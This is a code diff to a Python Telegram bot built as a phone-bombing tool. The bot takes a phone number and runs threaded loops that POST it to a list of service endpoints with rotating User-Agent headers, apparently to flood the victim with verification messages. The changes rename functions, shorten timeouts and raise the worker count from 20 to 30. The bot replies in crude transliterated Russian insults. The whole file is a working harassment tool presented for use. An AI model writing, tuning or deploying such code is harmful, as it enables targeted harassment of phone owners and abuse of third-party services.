@@ -35,19 +35,19 @@ awaiting = set()
 def is_phone(s):
     return bool(re.match(r'^\+?\d{7,15}$', s.strip()))
 
-def send_one(phone, url, headers):
+def send_req(phone, url, headers):
     try:
-        requests.post(url, data={'phone': phone}, headers=headers, timeout=3)
+        requests.post(url, data={'phone': phone}, headers=headers, timeout=2)
     except:
         pass
 
-def spam_loop(chat_id, phone, stop_event):
-    executor = ThreadPoolExecutor(max_workers=20)
-    while not stop_event.is_set():
+def spam_worker(chat_id, phone, stop):
+    executor = ThreadPoolExecutor(max_workers=30)
+    while not stop.is_set():
         headers = {'User-Agent': USER_AGENTS[hash(phone + str(threading.get_ident())) % len(USER_AGENTS)]}
-        futures = [executor.submit(send_one, phone, url, headers) for url in endpoints]
+        futures = [executor.submit(send_req, phone, url, headers) for url in endpoints]
         for f in futures:
-            if stop_event.is_set():
+            if stop.is_set():
                 executor.shutdown(wait=False)
                 break
     active.pop(chat_id, None)
@@ -59,10 +59,10 @@ def start(m):
     kb.add(InlineKeyboardButton("spam", callback_data="spam"))
     bot.send_message(m.chat.id, "zdarova pidr gotov spamat?", reply_markup=kb)
 
-@bot.callback_query_handler(func=lambda c: c.data == "spam")
-def callback_spam(c):
-    bot.answer_callback_query(c.id)
-    cid = c.message.chat.id
+@bot.callback_query_handler(func=lambda call: call.data == "spam")
+def callback_spam(call):
+    bot.answer_callback_query(call.id)
+    cid = call.message.chat.id
     if cid in active:
         bot.send_message(cid, "spam uje rabotaet ebalo zakroy i /stop")
         return
@@ -81,7 +81,7 @@ def start_spam(m):
     bot.reply_to(m, "drochka poehala chtoby zakanchivat /stop")
     stop = threading.Event()
     active[cid] = stop
-    threading.Thread(target=spam_loop, args=(cid, phone, stop), daemon=True).start()
+    threading.Thread(target=spam_worker, args=(cid, phone, stop), daemon=True).start()
 
 @bot.message_handler(commands=['stop'])
 def stop_cmd(m):
